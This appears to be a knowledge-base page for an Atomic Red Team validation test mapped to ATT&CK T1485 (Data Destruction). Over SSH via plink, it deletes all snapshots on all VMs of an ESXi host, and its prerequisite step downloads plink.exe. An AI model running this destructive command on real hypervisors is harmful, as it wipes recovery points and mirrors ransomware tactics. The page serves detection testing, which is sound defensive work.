---
atomic_guid: "1207ddff-f25b-41b3-aa0e-7c26d2b546d1"
title: "ESXi - Delete VM Snapshots"
framework: "atomic"
generated: "true"
attack_technique_id: "T1485"
attack_technique_name: "Data Destruction"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "1207ddff-f25b-41b3-aa0e-7c26d2b546d1"
  - "ESXi - Delete VM Snapshots"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ESXi - Delete VM Snapshots

Deletes all snapshots for all Virtual Machines on an ESXi Host
[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#inhibit%20recovery)

## Metadata

- Atomic GUID: 1207ddff-f25b-41b3-aa0e-7c26d2b546d1
- Technique: T1485: Data Destruction
- Platforms: windows
- Executor: command_prompt
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1485/T1485.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1485-data_destruction|T1485]]

## Input Arguments

### plink_file

- description: Path to Plink
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

### vm_host

- description: Specify the host name or IP of the ESXi server.
- type: string
- default: atomic.local

### vm_pass

- description: Specify the privileged user's password.
- type: string
- default: password

### vm_user

- description: Specify the privilege user account on the ESXi server.
- type: string
- default: root

## Dependencies

Check if we have plink

### Prerequisite Check

```powershell
if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.yaml)
